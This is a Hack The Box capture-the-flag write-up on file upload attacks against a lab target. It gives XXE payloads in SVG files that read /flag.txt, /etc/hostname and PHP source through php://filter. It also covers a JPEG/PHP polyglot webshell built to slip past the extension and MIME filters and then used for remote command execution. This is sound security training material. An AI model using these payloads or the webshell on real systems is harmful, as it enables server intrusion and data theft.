# Hack The Box File Upload Attacks Writeup

## Limited File Uploads

With SVG images, we can include malicious XML data to leak the source code of the web application, and other internal documents within the server.

Create `payload.svg` file to read `flag.txt`
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

Upload this file and view source to see the flag.

![image](https://github.com/user-attachments/assets/295d2b91-31c4-4ef6-acb9-4df151443e71)

For File Upload exploitation, it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.

Create `xxe.svg` file to get the file directory of uploaded files.
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
Upload this file and inspect to get the base64 string, decode that text to get the file directory.

![image](https://github.com/user-attachments/assets/541b634e-8e32-4116-9497-9fff49ec4af0)

## Skills Assessment - File Upload Attacks

To gain access to the internal workings of the file upload functionality, I first leveraged an XXE (XML External Entity) injection via an uploaded .svg file. The SVG was crafted to read the /etc/hostname file using the php://filter stream wrapper with base64 encoding
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
]>
<svg>&xxe;</svg>
```
![image](https://github.com/user-attachments/assets/3d4e9f39-337c-468d-9a5a-4398074d0038)


Upon uploading this file as `xxe.svg`, the response returned a base64-encoded string. Decoding it revealed the hostname: 

`ng-1280470-fileuploadsasmt-ueyj9-548bf6b74b-kg4j4` — the exact same output captured in the screenshot for verification. With this confirmation in hand, I moved on to targeting more sensitive files.

![image](https://github.com/user-attachments/assets/7ab45482-06e5-4af2-8103-28f04b47f993)

Next, I crafted a second XXE payload in a file named `xxe-for-upload.svg` to read the `upload.php` source code:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
<svg>&xxe;</svg>
```
Uploading and decoding the output gave insight into how uploaded files are handled on the backend. The PHP script performs several checks: it renames files using the format date('ymd')_<original_filename>, stores them in ./user_feedback_submissions/, and imposes both blacklist and whitelist filters.

```bash
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```
It blocks extensions like `.php`, `.phps`, and `.phtml`, and only allows filenames ending in `.jpg`, `.jpeg`, or `.png`, validated through a regex: `^.+\.[a-z]{2,3}g$`. It also validates the MIME type from both `content-type` and `mime_content_type()` as an extra defense.

Knowing this, I crafted a polyglot webshell by prepending JPEG magic bytes (FFD8FFDB) to a basic PHP shell payload (`AAAA <?php echo system($_GET["cmd"]); ?>`) and saved it with the name shell.phar.jpeg. This bypassed both extension and MIME type validations, appearing as a legitimate JPEG while still being interpreted as PHP by the server. Uploading this file worked successfully due to the format and naming convention.

![image](https://github.com/user-attachments/assets/e9f2fa4d-0f34-4554-9b2d-125b6a561d9e)

I changed these highlighted characters manually.

After this I uploaded the file.

![image](https://github.com/user-attachments/assets/046ce304-c4c2-49e0-9f6a-d6c60837aac4)

Today being 2025/04/19, the filename becomes `250419_original_name` the webshell was then accessible at the URL: `/contact/user_feedback_submissions/250419_shell.phar.jpeg`

So, I used Burp Suite to intercept and Visiting that URL with a cmd parameter allowed for remote command execution.

Accessing:
`/contact/user_feedback_submissions/250419_shell.phar.jpeg?cmd=cat+/flag.........txt`
successfully returned the flag contents.

![image](https://github.com/user-attachments/assets/1f7d7f28-343b-412e-9a68-5fd3d2db4a55)
